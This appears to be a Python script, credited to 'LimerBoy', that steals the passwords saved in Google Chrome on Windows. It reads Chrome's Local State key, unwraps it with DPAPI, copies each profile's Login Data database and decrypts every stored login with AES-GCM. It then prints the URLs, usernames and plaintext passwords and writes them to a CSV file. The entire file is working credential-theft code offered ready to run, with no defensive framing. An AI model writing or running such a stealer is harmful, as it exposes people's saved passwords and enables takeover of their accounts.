# Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % os.environ['USERPROFILE'])

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]  # Remove DPAPI prefix
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERR] Failed to get secret key: {e}")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        try:
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            return f"[RAW HEX] {decrypted_pass.hex()}"
    except Exception as e:
        print(f"[ERR] Unable to decrypt password: {e}")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Chrome DB error: {e}")
        return None

if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file)
            csv_writer.writerow(["index", "url", "username", "password"])

            secret_key = get_secret_key()
            if not secret_key:
                sys.exit(1)

            folders = [f for f in os.listdir(CHROME_PATH) if re.match(r"^Profile|^Default$", f)]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if not conn:
                    continue

                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if url and username and ciphertext:
                            password = decrypt_password(ciphertext, secret_key)
                            print(f"Sequence: {index}")
                            print(f"URL: {url}\nUser Name: {username}\nPassword: {password}\n")
                            print("*" * 50)
                            csv_writer.writerow([index, url, username, password])
                except Exception as e:
                    print(f"[ERR] Failed reading DB: {e}")
                finally:
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print(f"[FATAL ERR] {e}")
